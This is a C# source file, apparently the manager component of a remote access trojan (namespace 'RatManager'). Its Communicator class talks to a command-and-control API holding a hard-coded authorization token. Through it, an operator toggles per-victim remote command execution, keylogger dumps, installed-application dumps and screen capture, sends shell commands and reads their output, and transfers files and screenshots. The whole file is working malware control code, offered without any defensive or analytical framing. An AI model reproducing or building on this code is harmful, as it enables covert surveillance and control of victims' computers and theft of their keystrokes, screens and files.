using Newtonsoft.Json;
using RestSharp;


namespace RatManager
{
    public class ResponseData
    {
        public string version { get; set; }
        public bool result { get; set; }
    }

    public class ResponseDataFile
    {
        public string version { get; set; }
        public File result { get; set; }
    }

    public class ResponseData2
    {
        public string version { get; set; }
        public string result { get; set; }
    }

    public class ResponseData3
    {
        public string version { get; set; }
        public List<ClientVM> result { get; set; }
    }

    public class ResponseData4
    {
        public string version { get; set; }
        public List<string> result { get; set; }
    }

    internal class Communicator
    {
        private string url = "http://localhost:8080/api/";
        private string authorization = "WWLh/ojwlsph8LxG+eThCA==";
        public Communicator()
        {

        }

        #region set all for no
        public bool SetAllForNoCMDRun()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetAllForNoCMDRun";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetAllForNoApplicationDump()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetAllForNoInstalledAplicationDump";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetAllForNoConnect()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetAllForNoConnect";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetAllForNoKeyLogDump()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetAllForNoKeyLogDump";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetAllForNoRegistered()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetAllForNoRegistered";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetAllForNoUpdate()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetAllForNoUpdate";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetAllForNoRDP()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetAllForNoScreenShare";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        #endregion

        #region set for

        public bool SetForCMDRun(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetForCMDRun";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetForApplicationDump(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetForApplicationDump";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetForConnect(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetForConnect";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetForKeyLogDump(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetForKeyLogDump";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetForRegistered(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetForRegistered";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetForUpdate(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetForUpdate";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool SetForRDP(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetForScreenShare";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        #endregion



        public async Task<List<ClientVM>> SelectAll()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SelectAll";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
       
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData3>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return new List<ClientVM>();
            }
        }

        public bool IsRegistered(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IsRegistered";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool IsConnected(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/isconnected";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool IfUpdate(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IfUpdate";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool SetForNoUpdate(string clientId) {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetForNoUpdate";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool SetForNoApplicationDump(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetForNoApplicationDump";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public string SelectOPEN() { return ""; }

        public string SelectDOWN() { return ""; }

        public bool AddUser(string clientId) { return true; }

   
        public bool Register(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/Register";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool RegisterValue(string clientId, string data, string value) {

            if(string.IsNullOrEmpty(value))
            {
                value = "empty";
            }
            try
            {
                var client = new RestClient();
      
                string baseURL = url + "Client/RegisterValue/"+clientId+"/"+data;
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                
                request.AddHeader("Authorization", authorization);
                request.AddHeader("Content-Type", "application/json; charset=utf-8");
               
                Value toSend = new Value() { value = value };

                request.AddBody(toSend);
         
                RestResponse response = client.ExecutePost(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }

        }


        public List<string> GetValues(string clientId, string data)
        {

           
            try
            {
                var client = new RestClient();

                string baseURL = url + "Client/GetValues/" + clientId + "/" + data;
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();

                request.AddHeader("Authorization", authorization);
                request.AddHeader("Content-Type", "application/json; charset=utf-8");

       
                RestResponse response = client.Get(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData4>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return new List<string>();
            }

        }
        



        public class Value
        {
            public string value { get; set; }
        }


        public bool IfInstalledAplicationDump(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IfInstalledAplicationDump";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool IfKeyLogDump(string clientId) {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IfKeyLogDump";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool IfCMDRun(string clientId) 
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IfCMDRun";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool IfKeyScreenShare(string clientId) {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IfScreenShare";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public class Screen
        {
            public string b { get; set; }
        }

        public bool SetMyScreen(byte[] bytes) {

            try
            {
                var stringToSend =  Convert.ToBase64String(bytes);
                Screen screen = new Screen() { b = stringToSend };

                var client = new RestClient();
                string baseURL = url + "ScreenShare/SetMyScreen";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddHeader("Content-Type", "application/json; charset=utf-8");
                request.AddBody(screen);
                RestResponse response = client.ExecutePost(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }

        }

        public string GetMyScreen()
        {

            try
            {
               
                var client = new RestClient();
                string baseURL = url + "ScreenShare/GetMyScreen";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddHeader("Content-Type", "application/json; charset=utf-8");
                 RestResponse response = client.ExecuteGet(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData2>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return "";            }

        }


        public bool SendOutput(string output) {
            try
            {
                var client = new RestClient();
                string baseURL = url + "CMDCommunication/SendOutput";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("cmd", output);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool SendCMD(string cmd)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "CMDCommunication/SendCMD";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("cmd", cmd);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool ClearOutput()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "CMDCommunication/ClearOutput";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }


        public string ReadOutput()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "CMDCommunication/ReadOutput";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                if(response.Content.Length < 1)
                {
                    return "";
                }
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData2>(response.Content);
                return deserializedObject.result.Substring(1, deserializedObject.result.Length - 2);
            }
            catch
            {
                return "";
            }
        }

        public bool ClearCmd() {
            try
            {
                var client = new RestClient();
                string baseURL = url + "CMDCommunication/ClearCmd";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public string ReadCmd()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "CMDCommunication/ReadCmd";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData2>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return "";
            }
        }

        public bool WriteFile(string fileName, byte[] file) {
            try
            {

                File fileToSend = new File()
                {
                     bytes = file,
                      fileName = fileName
                };
                var client = new RestClient();
                string baseURL = url + "File/SetFile";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddHeader("Content-Type", "application/json; charset=utf-8");
                request.AddBody(fileToSend);
                RestResponse response = client.ExecutePost(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        
              public bool ClearFile()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "File/ClearFile";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                RestResponse response = client.ExecuteGet(request);
                var test = response.Content;
                if (test.Length < 1)
                {
                    return false;
                }
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public File GetFile()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "File/GetFile";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                RestResponse response = client.ExecuteGet(request);
                var test = response.Content;
                if(test.Length < 1)
                {
                    return null;
                }
                var deserializedObject = JsonConvert.DeserializeObject<ResponseDataFile>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return null;
            }
        }
    }

    public class File
    {
        public string fileName { get; set; }
        public byte[] bytes { get; set; }
    }


    public class ClientVM
    {

        public string clientId { get; set; }


        public bool ifConnected { get; set; }


        public bool ifRegistered { get; set; }


        public bool ifUpdate { get; set; }


        public bool IfInstalledAplicationDump { get; set; }

        public bool ifKeyLogDump { get; set; }


        public bool ifScreenShare { get; set; }


        public bool ifCMDRun { get; set; }
    }
}
